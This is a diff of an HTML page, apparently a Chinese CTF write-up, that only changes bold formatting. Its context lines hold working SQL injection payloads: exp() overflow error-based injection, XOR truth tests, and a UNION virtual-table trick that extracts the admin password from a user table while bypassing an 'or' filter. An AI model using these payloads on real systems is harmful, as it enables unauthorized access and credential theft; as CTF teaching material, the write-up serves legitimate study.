@@ -213,12 +213,12 @@ and exp(~(select * from(select user())a))
 <p><strong>1). 分析一下,通过异或来判断真假,因为过滤or关键字,不能查询information_schema表</strong></p>
 <pre><code class="language-SQL">'^(select exp(~( 查询语句 )*18446744073709551615)))#&amp;password=admin
 </code></pre>
-<p>** 2).  而且不知道列名,完成虚拟表构造,查询虚拟表c 的 b列就是,后面查询User表的密码**</p>
+<p><strong>2).  而且不知道列名,完成虚拟表构造,查询虚拟表c 的 b列就是,后面查询User表的密码</strong></p>
 <pre><code class="language-SQL">(select (  (( select c.b from (select 1 as a,2 as b,3 as d from user union select * from user)c where a='admin' )) )
 
 '^(select exp(~((select (  (( select c.b from (select 1 as a,2 as b,3 as d from user union select * from user)c where a='admin' )) ))*18446744073709551615)))#&amp;password=admin
 </code></pre>
-<p>** 3).  最后注入得到密码,进行后续操作,得到Flag**</p>
+<p><strong>3).  最后注入得到密码,进行后续操作,得到Flag</strong></p>
 
         </div>
         <!-- Share to Twitter, Weibo, Telegram -->
